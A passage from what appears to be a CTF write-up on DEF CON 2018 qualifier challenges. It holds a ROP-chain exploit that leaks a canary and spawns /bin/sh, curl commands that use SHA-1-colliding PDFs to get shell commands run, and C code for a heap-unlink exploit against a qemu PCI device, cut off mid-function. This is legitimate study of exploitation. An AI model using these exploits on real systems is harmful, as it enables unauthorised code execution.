</span></span><span class=line><span class=cl><span class=n>canary_low</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>canary_high</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>writable_spot</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>line</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;ld&#34;</span> <span class=ow>in</span> <span class=n>line</span> <span class=ow>and</span> <span class=n>canary_high</span> <span class=o>==</span> <span class=mi>0</span>  <span class=ow>and</span> <span class=s2>&#34;x&#34;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ld</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>canary_high</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>][:</span><span class=o>-</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>canary_low</span> <span class=o>==</span> <span class=mi>0</span> <span class=ow>and</span> <span class=s2>&#34;ld&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>line</span> <span class=ow>and</span> <span class=s2>&#34;x&#34;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>canary_low</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>][:</span><span class=o>-</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>writable_spot</span> <span class=o>==</span> <span class=mi>0</span> <span class=ow>and</span> <span class=s2>&#34;rw&#34;</span> <span class=ow>in</span> <span class=n>line</span> <span class=ow>and</span> <span class=s2>&#34;ld&#34;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>writable_spot</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=s2>&#34;0x</span><span class=si>%s%s</span><span class=s2>00&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>canary_high</span><span class=p>,</span> <span class=n>canary_low</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;The canary is &#34;</span><span class=p>,</span> <span class=n>canary</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>canary</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=p>(</span><span class=s2>&#34;</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>IMAGE_BASE_0</span> <span class=o>=</span>  <span class=n>ld</span> <span class=c1># ld-linux-x86-64.so.2</span>
</span></span><span class=line><span class=cl><span class=n>WRITABLE_OFFSET_0</span> <span class=o>=</span> <span class=n>writable_spot</span> <span class=o>-</span> <span class=n>ld</span>
</span></span><span class=line><span class=cl><span class=n>WRITABLE_OFFSET_1</span> <span class=o>=</span> <span class=n>WRITABLE_OFFSET_0</span> <span class=o>+</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>rebase_0</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span> <span class=p>:</span> <span class=n>p64</span><span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=n>IMAGE_BASE_0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;IMAGE_BASE 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>IMAGE_BASE_0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>rebase_0</span><span class=p>(</span><span class=mh>0x0000000000002112</span><span class=p>)</span> <span class=c1># 0x0000000000002112: pop rdi; ret; </span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>rebase_0</span><span class=p>(</span><span class=mh>0x00000000000106ca</span><span class=p>)</span> <span class=c1># 0x00000000000106ca: pop rsi; ret; </span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>rebase_0</span><span class=p>(</span><span class=n>WRITABLE_OFFSET_0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>rebase_0</span><span class=p>(</span><span class=mh>0x000000000001a247</span><span class=p>)</span> <span class=c1># 0x000000000001a387: mov qword ptr [rsi], rdi; xor eax eax; ret;</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>rebase_0</span><span class=p>(</span><span class=mh>0x0000000000002112</span><span class=p>)</span> <span class=c1># 0x0000000000002112: pop rdi; ret; </span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>rebase_0</span><span class=p>(</span><span class=n>WRITABLE_OFFSET_0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>rebase_0</span><span class=p>(</span><span class=mh>0x00000000000106ca</span><span class=p>)</span> <span class=c1># 0x00000000000106ca: pop rsi; ret; </span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>rebase_0</span><span class=p>(</span><span class=mh>0x0000000000000d5e</span><span class=p>)</span> <span class=c1># 0x0000000000000d5e: pop rax; pop rdx; pop rbx; ret; </span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x000000000000003b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>rebase_0</span><span class=p>(</span><span class=mh>0x000000000001b605</span><span class=p>)</span> <span class=c1># 0x000000000001b605: syscall; ret;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x58</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>rop</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;cat flag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>Flag: <code>OOO{ZOMG, WhAT iF order-of-the-overfow IS ddtek?!?!?!? Plot Twist!}</code></p><h2 class="relative group">Easy Pisy<div id=easy-pisy class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#easy-pisy aria-label=Anchor>#</a></span></h2><p>We were given a <a href=http://5a7f02d0.quals2018.oooverflow.io target=_blank>website</a> with two PHP files: <code>sign.php</code> and <code>execute.php</code>, as well as two example PDF files.</p><p>Looking at the source code, which was available, the <code>sign.php</code> endpoint received a PDF file, extracted the text using <code>ocrad</code>, an OCR software, signed it using <code>openssl_sign</code> with a private key that, of course, we could not access, and returned the signature. The server signed only files containing the text <code>ECHO</code> (but not <code>EXECUTE</code>).</p><p>The <code>execute.php</code> endpoint received via a <code>POST</code> request a file, <code>userfile</code>, and a signature, <code>signature</code>, verified the signature using <code>openssl_verify</code>, and extracted the text using the same <code>pdf_to_text</code> function used in <code>sign.php</code>. Then, if the text starts with <code>ECHO</code>, it just prints the OCRed text; instead, if the text starts with <code>EXECUTE</code>, it passes the OCRed text to <code>shell_exec</code>.</p><p>Clearly, we must find a way to sign a PDF file containing an image of a text that starts with <code>EXECUTE</code>, but our signing endpoint refuses to sign files that start with <code>EXECUTE</code>.</p><p>Looking at the PHP documentation for <code>openssl_sign()</code>, we observe that the default algorithm (the one it&rsquo;s used) is SHA1. Thus, we immediately thought of the (not-so-recently-discovered-anymore) SHA-1 collision technique (<a href=https://shattered.io/static/shattered.pdf%29 target=_blank>https://shattered.io/static/shattered.pdf)</a>. Indeed, if we could create two different PDF files that hash to the same SHA1 value, we could execute arbitrary commands and cat our flag.</p><p>To create colliding PDFs, we used this online SHA collider: <a href=https://alf.nu/SHA1 target=_blank>https://alf.nu/SHA1</a> to obtain two files <code>echo.pdf</code> and <code>execute.pdf</code>, one with a harmless <code>ECHO /bin/cat flag;</code> command, and the other one with <code>EXECUTE /bin/cat flag;</code>, both with the same SHA1 hash.</p><p>Once we have the two colliding files, it is only a matter of:</p><pre tabindex=0><code>curl -F &#34;userfile=@echo.pdf&#34; http://5a7f02d0.quals2018.oooverflow.io/sign.php
</code></pre><p>to sign the harmless file:</p><pre tabindex=0><code>Executing &#39;convert -depth 8 /tmp/phpMWWbFu.pdf /tmp/phpMWWbFu.ppm&#39;&lt;br/&gt;Executing &#39;ocrad /tmp/phpMWWbFu.ppm&#39;&lt;br/&gt;Extracted text: &#34;ECHO /bin/cat flag;&#34;&lt;br/&gt;I&#39;m OK with ECHO commands. Here is the signature: &lt;br/&gt;819c7fd2fc0b00849e01a1f5825001684b51f3e8664c004fc08e64b60c67a1efc9fd2ef030fc1e3458fee51a10aa2b1c9e125f49c6757ded05da9b6f050d8c625262654b68d24042cff1645230d1b3a51b51bc9eebc34d6c7c2759b50b050176ce0cea61dd3748d4a075ecf67767eb4f853ed8b741b8e3e7ebd66b34321af4b789f9b39e72c46d88be2beb84d32a844b76ca96685fa54590462af035d508947fb1d5bcf20b0592b77d9ab70e4f2c6d8995f50469befce3c9372b56c3b5d8ccd48b220a96fdf29b7b2499f49bf7d9fb3c87e3dfa3fa818561739b89b3aae54f4ce5e6c24d012598009fa3cddf12ae94f2d3554d22fdba379105c5fe6b1b71abd0
</code></pre><p>At this point,</p><pre tabindex=0><code>curl -F &#34;userfile=@execute.pdf&#34; -F &#34;signature=`cat signature.txt`&#34; http://5a7f02d0.quals2018.oooverflow.io/execute.php
</code></pre><p>leads to the flag:</p><pre tabindex=0><code>Signature is OK.&lt;br/&gt;Executing &#39;convert -depth 8 /tmp/php2dqia6.pdf /tmp/php2dqia6.ppm&#39;&lt;br/&gt;Executing &#39;ocrad /tmp/php2dqia6.ppm&#39;&lt;br/&gt;Text: &#34;EXECUTE /bin/cat flag;&#34;&lt;br/&gt;About to execute: &#34;/bin/cat flag;&#34;.&lt;br/&gt;Output: OOO{phP_4lw4y5_d3l1v3r5_3h7_b35T_fl4g5}
</code></pre><p>Flag: <code>OOO{phP_4lw4y5_d3l1v3r5_3h7_b35T_fl4g5}</code></p><h2 class="relative group">Elastic Cloud Compute<div id=elastic-cloud-compute class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#elastic-cloud-compute aria-label=Anchor>#</a></span></h2><p>For this challenge we were provided with a custom qemu binary and a barebones linux image.</p><p>Since the challenge description mentions &ldquo;extra PCI devices&rdquo; we started looking around in the qemu binary. Searching for interesting strings in the qemu binary let us find the functions that handle the additional driver (containing &ldquo;ooo_class_init&rdquo;).</p><p>Looking online for guides on how to add devices to qemu we actually found the <a href=https://github.com/qemu/qemu/blob/v2.7.0/hw/misc/edu.c target=_blank>source code</a> the driver was based on: this really helped in reversing the binary more quickly.</p><p>The driver handles writes and reads to its mapped memory by <code>malloc</code>ing memory and writing and reading data in the heap. It&rsquo;s easy to spot a problem: there is no bound checking on either of them. We can write and read on the heap with a range of 16 bits of offset, more than enough to corrupt the chunk headers and perform some heap exploitation.</p><p>A good target for our memory corruption is the array where the <code>malloc</code>ed pointers are saved, which is located in the bss. Controlling them would mean choosing where to read and write when accessing the driver&rsquo;s memory.</p><p>To manage this we exploited the unlink macro in the <code>free</code> call.</p><p>We allocate two consecutive chunks, then forge a fake chunk and store it in the first chunk&rsquo;s content space. We overwrite the prev_size header of the second chunk to make it look like the chunk preceding it is our forged chunk, and we unset the prev_inuse flag for the second chunk. We then free the second chunk, which in turn triggers a consolidation with our fake chunk.</p><p>By accurately writing all the size fields and the target pointers, all security checks pass and the unlink macro overwrites the pointer in the bss, which now points to the bss itself. We can now write directly on the bss and edit the pointers, which therefore means we managed to obtain an arbitrary write primitive.</p><p>To finish the challenge we simply overwrite the GOT entry of <code>free</code> with the function that prints the flag. We trigger a call to <code>free</code> and obtain the flag.</p><p>P.S.
We had some issues trying to compile and/or execute our exploit inside qemu. We managed to make it run with some glorified copy and paste.</p><p>Exploit to be run inside qemu:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>Basic PCI communication template from https://github.com/billfarrow/pcimem/blob/master/pcimem.c
</span></span></span><span class=line><span class=cl><span class=cm>Unlink exploit written following https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;errno.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;ctype.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;termios.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define PRINT_ERROR \
</span></span></span><span class=line><span class=cl><span class=cp>	do { \
</span></span></span><span class=line><span class=cl><span class=cp>		fprintf(stderr, &#34;Error at line %d, file %s (%d) [%s]\n&#34;, \
</span></span></span><span class=line><span class=cl><span class=cp>		__LINE__, __FILE__, errno, strerror(errno)); exit(1); \
</span></span></span><span class=line><span class=cl><span class=cp>	} while(0)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// map 24 bit address space
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define MAP_SIZE 16777216UL
</span></span></span><span class=line><span class=cl><span class=cp>#define MAP_MASK (MAP_SIZE - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pci_read</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>map_base</span><span class=p>,</span> <span class=kt>off_t</span> <span class=n>target</span><span class=p>,</span> <span class=kt>int</span> <span class=n>access_type</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>type_width</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int64_t</span> <span class=n>read_result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>*</span><span class=n>virt_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>virt_addr</span> <span class=o>=</span> <span class=n>map_base</span> <span class=o>+</span> <span class=p>(</span><span class=n>target</span> <span class=o>&amp;</span> <span class=n>MAP_MASK</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>switch</span><span class=p>(</span><span class=n>access_type</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;b&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=n>read_result</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>virt_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=n>type_width</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;h&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=n>read_result</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint16_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>virt_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=n>type_width</span> <span class=o>=</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;w&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=n>read_result</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>virt_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=n>type_width</span> <span class=o>=</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;d&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=n>read_result</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>virt_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=n>type_width</span> <span class=o>=</span> <span class=mi>16</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Illegal data type &#39;%c&#39;.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>access_type</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=nf>exit</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Value at offset 0x%X (%p): 0x%0*lX</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span> <span class=n>target</span><span class=p>,</span> <span class=n>virt_addr</span><span class=p>,</span> <span class=n>type_width</span><span class=p>,</span> <span class=n>read_result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pci_write</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>map_base</span><span class=p>,</span> <span class=kt>off_t</span> <span class=n>target</span><span class=p>,</span> <span class=kt>int</span> <span class=n>access_type</span><span class=p>,</span> <span class=kt>int64_t</span> <span class=n>writeval</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>type_width</span> <span class=o>=</span> <span class=mi>16</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int64_t</span> <span class=n>read_result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>*</span><span class=n>virt_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>virt_addr</span> <span class=o>=</span> <span class=n>map_base</span> <span class=o>+</span> <span class=p>(</span><span class=n>target</span> <span class=o>&amp;</span> <span class=n>MAP_MASK</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// printf(&#34;Virt addr %p\n&#34;, virt_addr);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// printf(&#34;Writeval %x\n&#34;, writeval);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>switch</span><span class=p>(</span><span class=n>access_type</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;b&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=o>*</span><span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>virt_addr</span><span class=p>)</span> <span class=o>=</span> <span class=n>writeval</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;h&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=o>*</span><span class=p>((</span><span class=kt>uint16_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>virt_addr</span><span class=p>)</span> <span class=o>=</span> <span class=n>writeval</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;w&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>virt_addr</span><span class=p>)</span> <span class=o>=</span> <span class=n>writeval</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;d&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>virt_addr</span><span class=p>)</span> <span class=o>=</span> <span class=n>writeval</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=c1>// printf(&#34;Written 0x%0*lX\n&#34;, type_width,
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//   writeval, type_width, read_result);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// write/read address is like [opcode, 4bit][memid, 4bit][subaddress, 16bit]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// malloc: write to memory with opcode 0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>mall</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>map_base</span><span class=p>,</span> <span class=kt>int</span> <span class=n>index</span><span class=p>,</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// malloc size = valtowrite * 8
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>off_t</span> <span class=n>target</span> <span class=o>=</span> <span class=p>((</span><span class=n>index</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>pci_write</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=n>target</span><span class=p>,</span> <span class=sc>&#39;w&#39;</span><span class=p>,</span> <span class=n>size</span> <span class=o>/</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>	
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// write to pointed area: write to memory with opcode 2
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>write_heap</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>map_base</span><span class=p>,</span> <span class=kt>int</span> <span class=n>index</span><span class=p>,</span> <span class=kt>int64_t</span> <span class=n>writeval</span><span class=p>,</span> <span class=kt>int</span> <span class=n>offset</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// offset is a 16 bit value
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>off_t</span> <span class=n>target</span> <span class=o>=</span> <span class=n>offset</span> <span class=o>|</span> <span class=p>((</span><span class=n>index</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=mi>2</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>pci_write</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=n>target</span><span class=p>,</span> <span class=sc>&#39;w&#39;</span><span class=p>,</span> <span class=n>writeval</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl><span class=c1>// free: write to memory with opcode 1
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>myfree</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>map_base</span><span class=p>,</span> <span class=kt>int</span> <span class=n>index</span><span class=p>)</span> <span class=p>{</span>
